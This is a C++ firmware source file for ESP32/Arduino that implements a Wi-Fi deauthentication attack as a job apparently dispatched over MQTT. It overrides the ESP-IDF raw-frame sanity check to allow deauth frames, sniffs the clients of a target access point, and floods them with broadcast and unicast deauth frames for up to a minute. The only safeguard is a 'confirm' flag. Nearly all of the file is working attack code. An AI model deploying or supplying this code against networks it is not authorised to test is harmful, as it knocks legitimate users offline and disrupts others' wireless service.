#include "wifi_deauth.h"
#include "../radio.h"
#include "../mqtt_client.h"

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <array>

#include <ArduinoJson.h>

#if defined(ESP_PLATFORM) || defined(ARDUINO)
#define NMS_HAS_RADIO 1
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>

extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
    return 0;
}

static const size_t MAX_DEAUTH_CLIENTS = 32;
static uint8_t s_targetBssid[6];
static std::array<uint8_t, 6> s_clientList[MAX_DEAUTH_CLIENTS];
static volatile size_t s_clientCount = 0;
static portMUX_TYPE s_clientMux = portMUX_INITIALIZER_UNLOCKED;

static void clientSnifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA) return;
    const wifi_promiscuous_pkt_t* pkt = reinterpret_cast<const wifi_promiscuous_pkt_t*>(buf);
    const uint8_t* hdr = pkt->payload;

    if ((hdr[1] & 0x03) != 0x01) return; // To-DS = 1, From-DS = 0

    const uint8_t* ap  = hdr + 4;   // Addr1 = BSSID
    const uint8_t* sta = hdr + 10;  // Addr2 = client

    if (memcmp(ap, s_targetBssid, 6) != 0) return;

    portENTER_CRITICAL_ISR(&s_clientMux);
    bool seen = false;
    for (size_t i = 0; i < s_clientCount; i++) {
        if (memcmp(s_clientList[i].data(), sta, 6) == 0) {
            seen = true;
            break;
        }
    }
    if (!seen && s_clientCount < MAX_DEAUTH_CLIENTS) {
        memcpy(s_clientList[s_clientCount].data(), sta, 6);
        s_clientCount++;
    }
    portEXIT_CRITICAL_ISR(&s_clientMux);
}

static const uint8_t DEAUTH_FRAME_TEMPLATE[26] = {
    0xC0, 0x00,                         // Frame Control (Deauth)
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Addr1 = destination (broadcast default)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Addr2 = source AP
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Addr3 = BSSID
    0x00, 0x00,                         // Sequence Control
    0x02, 0x00                          // Reason code: 2 (Previous auth not valid)
};

static uint32_t sendDeauthBurst(const uint8_t bssid[6]) {
    uint8_t pkt[26];
    uint32_t sent = 0;
    memcpy(pkt, DEAUTH_FRAME_TEMPLATE, 26);
    memcpy(pkt + 10, bssid, 6);
    memcpy(pkt + 16, bssid, 6);

    // Broadcast
    memcpy(pkt + 4, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
    if (esp_wifi_80211_tx(WIFI_IF_AP, pkt, 26, true) == ESP_OK) {
        sent++;
    }

    // Unicast to discovered clients
    portENTER_CRITICAL(&s_clientMux);
    size_t count = s_clientCount;
    portEXIT_CRITICAL(&s_clientMux);

    for (size_t i = 0; i < count; i++) {
        memcpy(pkt + 4, s_clientList[i].data(), 6);
        if (esp_wifi_80211_tx(WIFI_IF_AP, pkt, 26, true) == ESP_OK) {
            sent++;
        }
    }
    return sent;
}
#else
#define NMS_HAS_RADIO 0
#endif

static bool parseMacStr(const char* s, uint8_t out[6]) {
    if (s == nullptr) return false;
    int vals[6];
    int n = sscanf(s, "%x:%x:%x:%x:%x:%x",
                   &vals[0], &vals[1], &vals[2], &vals[3], &vals[4], &vals[5]);
    if (n != 6) return false;
    for (int i = 0; i < 6; ++i) {
        if (vals[i] < 0 || vals[i] > 0xff) return false;
        out[i] = (uint8_t)vals[i];
    }
    return true;
}

bool runWifiDeauth(const RunnerCtx& ctx, EmitChunkFn emit, IsCancelledFn cancelled,
                   void* sink, uint32_t* resultsOut,
                   char* errCode, size_t errCodeSize,
                   char* errMsg, size_t errMsgSize) {
    (void)cancelled;
    JsonDocument doc;
    if (deserializeJson(doc, ctx.args) != DeserializationError::Ok) {
        snprintf(errCode, errCodeSize, "bad_args");
        snprintf(errMsg, errMsgSize, "args are not valid JSON");
        return false;
    }

    bool confirm = doc["confirm"] | false;
    if (!confirm) {
        snprintf(errCode, errCodeSize, "bad_args");
        snprintf(errMsg, errMsgSize, "confirm must be true");
        return false;
    }

    const char* bssidStr = doc["target_bssid"] | "";
    uint8_t bssid[6];
    if (!parseMacStr(bssidStr, bssid)) {
        snprintf(errCode, errCodeSize, "bad_args");
        snprintf(errMsg, errMsgSize, "invalid target_bssid");
        return false;
    }

    uint8_t channel = doc["channel"] | 1;
    if (channel < 1 || channel > 14) channel = 1;
    uint16_t durationS = doc["duration_s"] | 10;
    if (durationS < 1 || durationS > 60) durationS = 10;
    uint8_t bursts = doc["bursts"] | 5;
    if (bursts < 1 || bursts > 20) bursts = 5;

#if NMS_HAS_RADIO
    mqttPublishAccepted(ctx.job_id);
    mqttPublishSurveying((uint32_t)durationS + 10u);

    mqttSurveyPauseBegin();
    uint32_t t0 = millis();
    while (!mqttSurveyPausedAck() && (millis() - t0) < 1500) delay(10);
    mqttDisconnectClean();

    WiFi.mode(WIFI_MODE_AP);
    esp_wifi_start();
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    memcpy(s_targetBssid, bssid, 6);
    s_clientCount = 0;
    esp_wifi_set_promiscuous_rx_cb(clientSnifferCb);
    esp_wifi_set_promiscuous(true);

    uint32_t sniffStart = millis();
    while (millis() - sniffStart < 400) delay(1);

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);

    uint32_t startMs = millis();
    uint32_t totalFrames = 0;
    uint32_t deadline = startMs + (durationS * 1000);

    while (millis() < deadline) {
        for (uint8_t b = 0; b < bursts; b++) {
            totalFrames += sendDeauthBurst(bssid);
        }
        delay(10);
    }
    uint32_t durationMs = millis() - startMs;

    esp_wifi_stop();
    WiFi.mode(WIFI_STA);
    WiFi.begin();
    uint32_t wifiWait = millis();
    while (WiFi.status() != WL_CONNECTED && (millis() - wifiWait) < 20000) delay(200);
    if (WiFi.status() == WL_CONNECTED) {
        mqttConnect();
    }
    mqttSurveyPauseEnd();

    char chunk[256];
    snprintf(chunk, sizeof(chunk),
             "{\"deauth\":{\"target_bssid\":\"%s\",\"channel\":%u,\"clients_found\":%u,\"frames_sent\":%u,\"duration_ms\":%u}}",
             bssidStr, (unsigned)channel, (unsigned)s_clientCount, (unsigned)totalFrames, (unsigned)durationMs);
    emit(sink, chunk);
    if (resultsOut) *resultsOut = 1;
#else
    char chunk[256];
    snprintf(chunk, sizeof(chunk),
             "{\"deauth\":{\"target_bssid\":\"%s\",\"channel\":%u,\"clients_found\":0,\"frames_sent\":0,\"duration_ms\":0}}",
             bssidStr, (unsigned)channel);
    emit(sink, chunk);
    if (resultsOut) *resultsOut = 1;
#endif

    return true;
}
